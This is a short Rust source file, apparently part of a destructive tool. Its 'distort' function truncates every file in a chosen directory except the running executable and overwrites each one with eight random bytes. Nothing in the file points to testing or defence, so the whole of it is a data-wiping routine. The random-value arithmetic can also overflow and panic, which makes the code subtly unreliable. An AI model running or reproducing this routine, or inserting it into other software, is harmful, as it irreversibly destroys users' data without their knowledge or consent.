use std::env;
use std::fs::{DirEntry, OpenOptions};
use std::io::Write;
use std::path::Path;
use rand::{self, Rng};

pub fn distort(dir_path: &Path) {
    let mut rng = rand::thread_rng();

    let files = get_files_for_distorting(dir_path);

    for file in files {
        if let Ok(mut file) = OpenOptions::new().write(true).truncate(true).open(file.path()) {
            let _ = file.write_all(&(rng.gen::<u64>() * 10_000).to_be_bytes());
        }
    }
}

fn get_files_for_distorting(dir_path: &Path) -> Vec<DirEntry> {
    let file_path = env::current_exe().unwrap();

    if !dir_path.is_dir() {
        return vec![];
    }

    if let Ok(files) = dir_path.read_dir() {
        return files
            .filter(|file| file.as_ref().unwrap().path().ne(&file_path))
            .map(|file| file.unwrap())
            .collect()
    }

    vec![]
}